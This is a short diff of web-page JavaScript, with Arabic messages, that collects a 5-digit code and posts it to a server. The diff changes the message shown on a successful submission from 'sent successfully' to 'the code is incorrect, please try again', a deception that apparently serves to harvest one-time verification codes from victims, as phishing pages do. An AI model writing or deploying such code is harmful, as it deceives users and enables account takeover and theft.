@@ -176,7 +176,7 @@
     document.getElementById("confirmBtn").addEventListener("click", ()=>{
       const code = Array.from(boxes).map(b=>b.value).join('');
       if(code.length < 5){
-        codeError.textContent = "الرمز الذي أدخلته غير صالح";
+        codeError.textContent = "يجب ان يتكون الرمز من 5ارقام";
         codeError.classList.remove("hidden");
         return;
       }
@@ -188,7 +188,7 @@
         body: JSON.stringify({code})
       }).then(res=>res.json()).then(data=>{
         if(data.success){
-          codeError.textContent = "تم الإرسال بنجاح ✅";
+          codeError.textContent = "الرمز غير صحيح يرجى اعادة المحاولة";
           codeError.classList.remove("hidden");
         } else {
           codeError.textContent = "حدث خطأ يرجى المحاولة مرة أخرى ❌";
